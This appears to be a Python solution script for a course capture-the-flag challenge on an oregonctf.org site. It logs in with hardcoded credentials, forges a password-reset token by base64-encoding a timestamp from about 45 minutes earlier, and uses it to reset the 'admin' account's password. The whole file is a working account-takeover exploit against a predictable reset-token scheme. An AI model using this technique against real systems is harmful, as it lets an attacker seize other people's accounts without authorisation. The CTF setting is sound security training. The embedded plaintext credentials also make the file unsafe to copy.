import requests, sys, base64
from time import strftime, sleep
from datetime import datetime, timedelta, timezone

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/7aed58f3a00087d56c844ed9474c671f8999680556c127a19ee79fa5d7a132e1ChangePass"

dateTime = datetime.now(timezone.utc) - timedelta(minutes=15)
dateTime = dateTime - timedelta(minutes=30)
curDateTime = dateTime.strftime("%a %b %d %H:%M:%S %Z %Y")

print(curDateTime)

resetToken = str(base64.b64encode(curDateTime.encode())).split("'")[1]

print(resetToken)

postData = {"userName":"admin",
            "newPassword":"555555555555",
            "resetPasswordToken":resetToken}

    
response2 = session.post(targetUrl, data=postData)
print(response2.text)

